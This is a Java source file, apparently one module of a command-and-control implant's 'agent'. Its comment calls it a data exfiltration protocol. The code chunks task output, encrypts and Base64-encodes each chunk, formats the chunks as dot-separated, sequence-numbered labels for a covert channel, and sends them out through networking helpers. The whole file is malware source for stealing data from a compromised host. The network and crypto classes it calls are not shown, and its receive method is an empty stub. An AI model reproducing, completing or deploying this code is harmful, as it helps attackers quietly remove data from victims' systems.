package agent;

import java.lang.reflect.InvocationTargetException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Hashtable;
import java.util.Base64;

import javax.naming.NamingException;

public class Data {
	//data exfiltration protocol
	public static Hashtable receive(ArrayList<String> response, String nonce) {
		return new Hashtable();
	}
	
	public static ArrayList<String> make(String data, String msgID, String cookie, String nonce) throws Exception {
		ArrayList<String> chunkify = Util.chunkify(data, 16);
		ArrayList<String> reassign = new ArrayList<String>();
		for (int i=0; i<chunkify.size(); i++) {
			String dataChunk = chunkify.get(i);
			byte[] encrypted = Crypt.encrypt(dataChunk.getBytes(), nonce.getBytes());
			String buffer = Base64.getEncoder().encodeToString(encrypted);
			String compiled =  "." + buffer + "." + Integer.toString(i) + "." + Integer.toString(chunkify.size()) + ".0." + msgID;
			reassign.add(compiled);
		}
		return reassign;
		
	}
	
	public static Hashtable dispatch(String msgID, String data, String etc) throws Exception {
		String nonce = Util.strand(12);
		String messageID = Util.strand(4);
		Hashtable jobOut = (Hashtable) Main.schtasks.get(data);
		String sendData = Util.untabify(jobOut);
		Hashtable svrParams = Netw.send("Kex",messageID,sendData,nonce);
		ArrayList<String> made = make(sendData,messageID,etc,nonce);
		//blank receive method to ensure proper behavior
		return receive(Netw.onomancy(made),nonce);
	}
}
